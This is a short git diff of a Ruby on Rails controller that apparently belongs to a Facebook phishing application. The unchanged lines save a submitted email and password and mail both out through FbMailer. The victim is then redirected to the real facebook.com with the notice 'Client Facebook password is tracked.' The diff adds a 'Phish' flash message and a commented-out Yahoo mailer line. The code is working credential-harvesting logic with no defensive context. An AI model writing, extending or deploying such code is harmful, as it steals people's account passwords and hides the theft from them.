@@ -10,6 +10,7 @@ class FbsController < ApplicationController
   # GET /fbs/1
   # GET /fbs/1.json
   def show
+    flash[:notice]= 'This email id is attacked by a Phish'
   end
 
   # GET /fbs/new
@@ -29,6 +30,7 @@ class FbsController < ApplicationController
     respond_to do |format|
       if @fb.save
         FbMailer.fb_created(@fb.email,@fb.password).deliver
+        # YahooMailer.ymail_created.deliver
         format.html { redirect_to 'https://www.facebook.com/', notice: 'Client Facebook password is tracked.' }
         format.json { render :show, status: :created, location: @fb }
       else
